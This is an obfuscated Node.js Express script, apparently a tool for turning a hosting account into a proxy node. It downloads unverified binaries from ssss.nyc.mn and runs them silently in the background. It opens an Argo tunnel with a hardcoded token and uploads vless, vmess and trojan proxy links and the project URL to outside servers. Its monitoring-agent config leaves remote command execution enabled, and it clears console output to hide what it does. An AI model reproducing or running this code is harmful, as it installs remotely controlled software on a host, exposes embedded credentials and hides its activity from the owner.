_0x400945=_0x311327;console['clear'](),console[_0x400945(0x128)](_0x400945(0xfc)),console[_0x400945(0x128)](_0x400945(0xf5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5de80a={_0x44d90e:0x149,_0x4cef2c:0x125,_0x7de3e3:0x128,_0x135c04:0xcc,_0x22d0af:0xc2,_0xd44484:0x15b},_0x3ad7af=_0x14e858;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3ad7af(0xea));return;}try{const _0x2b0a09=await axios[_0x3ad7af(_0x5de80a._0x44d90e)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3ad7af(_0x5de80a._0x4cef2c)}});return console[_0x3ad7af(_0x5de80a._0x7de3e3)](_0x3ad7af(_0x5de80a._0x135c04)),_0x2b0a09;}catch(_0x507b42){return console[_0x3ad7af(_0x5de80a._0x22d0af)](_0x3ad7af(_0x5de80a._0xd44484)+_0x507b42['message']),null;}}function _0x199a(){const _0x5ce49c=['\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','stringify','abcdefghijklmnopqrstuvwxyz','CFPORT','/trojan-argo','9apdqIH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','country_code','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','close','substring','/api/add-nodes','readdirSync','App\x20is\x20running','\x0a\x20\x20credentials-file:\x20','catch','tls','list.txt','message','TunnelSecret','SUB_PATH','countryCode','2fmlUNA','forEach','\x20is\x20created','readFileSync','config.json','3223692MpSNBG','127.0.0.1','then','NAME','freedom','Empowerment\x20success\x20for\x20','org','aarch64','\x20is\x20running','2083','https://amd64.ssss.nyc.mn/bot','/api/add-subscriptions','\x20successfully','/dev/null','NEZHA_KEY','nohup\x20','Content-Type','Unknown','2053','pop','209972siulDx','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','split','\x22\x20>\x20/dev/null\x202>&1','clear','direct','application/json','npm\x20running\x20error:\x20','tunnel.yml','log','arm64','\x0a\x0atrojan://','.tmp','2096','ARGO_PORT','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','https://arm64.ssss.nyc.mn/web','createWriteStream','success','UPLOAD_URL','xtls-rprx-vision','join','tunnel.json','http','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','CFIP','fileUrl','\x20-c\x20','?encryption=none&security=tls&sni=','\x20-c\x20\x22','block','PROJECT_URL','env','/tunnel.yml\x20run','response','get','Download\x20','/api/delete-nodes','config.yaml','PORT','https://amd64.ssss.nyc.mn/v1','post','match','?security=tls&sni=','\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','trojan','boot.log','Error\x20downloading\x20files:','arm','http://ip-api.com/json','length','set','data','https://arm64.ssss.nyc.mn/bot','none','ARGO_DOMAIN:','\x20-p\x20','amd','Add\x20automatic\x20access\x20task\x20faild:\x20','status','1501230wIBeuA','utf-8','listen','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','writeFileSync','filter','promises','Galaxy','child_process','win32','https://amd64.ssss.nyc.mn/web','galaxy.hndz.qzz.io','push','chmod','existsSync','--tls','8443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&path=%2Fvless-argo%3Fed%3D2560#','readFile','5VgcUei','express','web\x20running\x20error:\x20','\x20failed:\x20','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2087','index.html','http\x20server\x20is\x20running\x20on\x20port:','sub','toString','charAt','true','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','test','unshift','mkdirSync','AUTO_ACCESS','unlink','Unhandled\x20error\x20in\x20startserver:','NEZHA_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','util','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiYmNhZDc2M2UtYzhhOC00YTI1LWJiYmItYjYxZDFmZmMwNmY2IiwicyI6IlpqVXdORGRqTVRJdE1XWmpNQzAwWlRGaExUaG1OVEl0TVRBek1XRmlPRFEyT0dFMSJ9','send','UUID','error','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','165640qbVrlM','16260180Dzkkss','Error\x20executing\x20command:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','\x0a\x20\x20tunnel:\x20','pkill\x20-f\x20\x22[','FILE_PATH','automatic\x20access\x20task\x20added\x20successfully','all','quic','1860220UZVvYb','/vmess-argo','text/plain;\x20charset=utf-8','utf8','taskkill\x20/f\x20/im\x20','Subscription\x20uploaded\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','platform','from','\x0aclient_secret:\x20','Error\x20in\x20startserver:','includes','\x20>\x20nul\x202>&1','statSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','path','84705c0d-5036-44b1-a07e-d1582e653595','https://arm64.ssss.nyc.mn/agent','ARGO_AUTH','Error\x20reading\x20boot.log:','/vless-argo','.exe\x20>\x20nul\x202>&1','7759164ZJnnkh','finish','vless','base64','Nodes\x20uploaded\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x0avmess://','basename','tcp','ARGO_DOMAIN'];_0x199a=function(){return _0x5ce49c;};return _0x199a();}async function startserver(){const _0xd916c1={_0x4b2415:0xd9},_0x341290=_0x14e858;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c7d84){console['error'](_0x341290(_0xd916c1._0x4b2415),_0x3c7d84);}}startserver()[_0x14e858(0xfe)](_0x20373a=>{const _0x3a2ae7=_0x14e858;console[_0x3a2ae7(0xc2)](_0x3a2ae7(0xbb),_0x20373a);}),app[_0x14e858(0x143)]('/',async function(_0x126fec,_0x39cbf2){const _0x5d94fc={_0x223f0c:0x170,_0x47ef2b:0xd2,_0x2ea39a:0x12e},_0x184212=_0x14e858;try{const _0x5aceba=path['join'](__dirname,_0x184212(0x179)),_0x5fab4c=await fs[_0x184212(0x163)][_0x184212(_0x5d94fc._0x223f0c)](_0x5aceba,_0x184212(_0x5d94fc._0x47ef2b));_0x39cbf2[_0x184212(0xc0)](_0x5fab4c);}catch(_0x5282bb){_0x39cbf2['send'](_0x184212(_0x5d94fc._0x2ea39a));}}),app[_0x14e858(0x15f)](PORT,()=>console[_0x14e858(0x128)](_0x14e858(0x17a)+PORT+'!'));
